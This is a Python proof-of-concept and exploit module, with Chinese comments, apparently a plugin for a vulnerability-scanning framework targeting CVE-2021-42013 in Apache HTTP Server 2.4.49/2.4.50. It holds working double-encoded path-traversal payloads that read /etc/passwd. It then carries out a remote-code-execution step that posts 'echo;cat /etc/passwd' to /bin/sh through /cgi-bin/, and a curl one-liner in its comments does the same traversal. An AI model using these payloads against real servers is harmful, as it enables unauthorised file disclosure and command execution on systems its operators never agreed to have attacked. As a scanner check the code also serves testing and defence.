from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests

POC_NAME = "CVE_2021_42013_poc_and_exploit"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_42013_poc_and_exploit(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0045',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_42013_poc_and_exploit',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-10-22',    # PoC创建时间
            },

        'vul': {
            'Product': 'Apache 2.4.49 和 Apache 2.4.50',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '路径穿越读取文件',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Apache HTTP Server 2.4.50 中对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置 “要求全部拒绝” 的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-09-22',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,"/icons/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/etc/passwd") # /icons/必须是一个存在且可访问的目录

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        #resp = req(url, 'get', headers=header, allow_redirects=False)
        resp = req(url, 'get', headers=header, allow_redirects=False)
        if resp.status_code == 200 and "root" in resp.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp.text
            if verbose:
                highlight("[+] url: " + url + " 存在Apache HTTP Server 2.4.50 路径穿越patch绕过漏洞！！！")
        else:
            if verbose:
                highlight("[+] url: " + url + " 不存在Apache HTTP Server 2.4.50 路径穿越patch绕过漏洞！！！")

# curl -v --path-as-is http://192.168.190.134:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
# /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
# echo;cat /etc/passwd

        print("[+] .........................................")
        print("[+] continue exploiting CVE_2021_42013 RCE...")
        print("[+] .........................................")

        # 以下是PoC的检测逻辑
        url1 = urljoin(target,"/cgi-bin/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/bin/sh")

        header1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        data = "echo;cat+/etc/passwd"

        #resp = req(url, 'get', headers=header, allow_redirects=False)
        req1 = requests.post(url=url1, data=data, headers=header1,verify=False, timeout=5)
        if req1.status_code == 200 and "root" in req1.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url1    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = req1.text
            if verbose:
                highlight("[+] exploit CVE_2021_42013 RCE success！！！")
        else:
            if verbose:
                highlight("[+] exploit CVE_2021_42013 RCE failed！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)